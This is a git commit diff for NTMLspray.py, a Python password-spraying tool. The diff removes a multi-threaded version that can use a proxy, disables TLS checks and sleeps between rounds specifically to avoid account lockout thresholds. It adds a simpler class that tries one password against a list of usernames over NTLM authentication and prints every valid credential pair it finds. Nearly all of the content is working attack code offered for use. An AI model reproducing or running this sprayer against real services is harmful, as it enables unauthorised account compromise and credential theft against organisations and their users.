b399fe227246f15f77cc66fae67e2ea6df4921c0
KhalidElGazzer <126703288+KhalidElGazzer@users.noreply.github.com>
2024-08-08 23:43:24 +0300

    Update NTMLspray.py

--- NTMLspray.py
+++ NTMLspray.py
@@ -1,145 +1,72 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
 
 import requests
-from requests_ntlm import *
+from requests_ntlm import HttpNtlmAuth
+import sys, getopt
 
-from base64 import b64encode as be, b64decode as bd
-import argparse
-from time import sleep, time
-from datetime import datetime
-import urllib3
+class NTLMSprayer:
+    def __init__(self, fqdn):
+        self.HTTP_AUTH_FAILED_CODE = 401
+        self.HTTP_AUTH_SUCCEED_CODE = 200
+        self.verbose = True
+        self.fqdn = fqdn
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    def load_users(self, userfile):
+        self.users = []
+        lines = open(userfile, 'r').readlines()
+        for line in lines:
+            self.users.append(line.replace("\r", "").replace("\n", ""))
 
-from multiprocessing import Pool
+    def password_spray(self, password, url):
+        print ("[*] Starting passwords spray attack using the following password: " + password)
+        count = 0
+        for user in self.users:
+            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+                count += 1
+                continue
+            if (self.verbose):
+                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
+                    print ("[-] Failed login with Username: " + user)
+        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
 
-
-def check_creds(opts):
-    url, domain, username, password, authtype, proxies, track_time = opts
-
-    headers = {}
-    if authtype == "ntlm":
-        if domain:
-            auth = HttpNtlmAuth(f"{domain}\\{username}", password)
-        else:
-            auth = HttpNtlmAuth(username, password)
-
-        # headers = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="}
-        headers = {"X-Force-NTLM": "true"}
-    else:
-        if domain:
-            auth = (f"{domain}\\{username}", password)
-        else:
-            auth = (username, password)
+def main(argv):
+    userfile = ''
+    fqdn = ''
+    password = ''
+    attackurl = ''
 
     try:
-        timeA = time()
-        res = requests.get(
-            url,
-            verify=False,
-            proxies=proxies,
-            auth=auth,
-            headers=headers,
-            allow_redirects=False,
-        )
-        timeB = time()
-        elapsedTimeMs = round((timeB - timeA) * 1000, 2)
+        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
+    except getopt.GetoptError:
+        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        sys.exit(2)
 
-        if res.status_code != 401 and res.status_code != 403:
-            if track_time:
-                print(f"Success! {username}:{password}  - {elapsedTimeMs}ms")
-            else:
-                print(f"Success! {username}:{password}")
+    for opt, arg in opts:
+        if opt == '-h':
+            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+            sys.exit()
+        elif opt in ("-u", "--userfile"):
+            userfile = str(arg)
+        elif opt in ("-f", "--fqdn"):
+            fqdn = str(arg)
+        elif opt in ("-p", "--password"):
+            password = str(arg)
+        elif opt in ("-a", "--attackurl"):
+            attackurl = str(arg)
 
-            return username, password
+    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
+        #Start attack
+        sprayer = NTLMSprayer(fqdn)
+        sprayer.load_users(userfile)
+        sprayer.password_spray(password, attackurl)
+        sys.exit()
+    else:
+        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        sys.exit(2)
 
-        elif track_time:
-            print(f"Fail:  {username}:{password}  - {elapsedTimeMs}ms")
-    except Exception as e:
-        print(f"Error occurred with {username}:{password}: {e}")
 
 
 if __name__ == "__main__":
-    args = argparse.ArgumentParser()
-
-    args.add_argument(
-        "-u", "--usernames", help="List of usernames to attack", required=True
-    )
-    args.add_argument(
-        "-p", "--passwords", help="List of passwords to try", required=True
-    )
-    args.add_argument(
-        "-d",
-        "--domain",
-        help="Domain name to append. If not included, then domains will be assumed to be in username list.",
-        required=False,
-    )
-    args.add_argument("-U", "--url", help="URL to authenticate against", required=True)
-    args.add_argument(
-        "-a",
-        "--attempts",
-        help="Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3",
-        type=int,
-        default=1,
-    )
-    args.add_argument(
-        "-i",
-        "--interval",
-        help="Number of minutes to sleep between attacks. If your lockout policy is per 10 minutes, set this to like 11",
-        type=int,
-        default=120,
-    )
-    args.add_argument(
-        "--authtype",
-        help="Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM",
-        choices=["ntlm", "basic"],
-        default="basic",
-    )
-    args.add_argument("--proxy", help="Proxy server to route traffic through")
-    args.add_argument("--threads", help="Number of threads", type=int, default=1)
-    args.add_argument(
-        "--output", help="File to write successful pairs to", default="success.log"
-    )
-    args.add_argument(
-        "--add_response", help="Add response times to output", action="store_true"
-    )
-    opts = args.parse_args()
-
-    if opts.proxy and opts.authtype == "basic":
-        proxies = {"http": opts.proxy, "https": opts.proxy}
-    else:
-        proxies = {}
-
-    usernames = [u for u in open(opts.usernames).read().split("\n") if u]
-
-    passwords = [p for p in open(opts.passwords).read().split("\n") if p]
-
-    i = 0
-    current = 1
-    total = len(passwords)
-    f = open(opts.output, "a")
-    f.write(f"New run: {str(datetime.now())}\n")
-    print(f"New password spraying run")
-    print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
-    print(f"URL: {opts.url}")
-    for p in passwords:
-        i += 1
-
-        print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
-        attempts = [
-            (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response)
-            for u in usernames
-        ]
-        with Pool(opts.threads) as p:
-            for s in p.imap_unordered(check_creds, attempts):
-                if s:
-                    f.write(f"{s[0]}:{s[1]}" + "\n")
-                    f.flush()
-
-        if i == opts.attempts:
-            print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
-            sleep(opts.interval * 60)
-
-            i = 0
-
-        current += 1
+    main(sys.argv[1:])
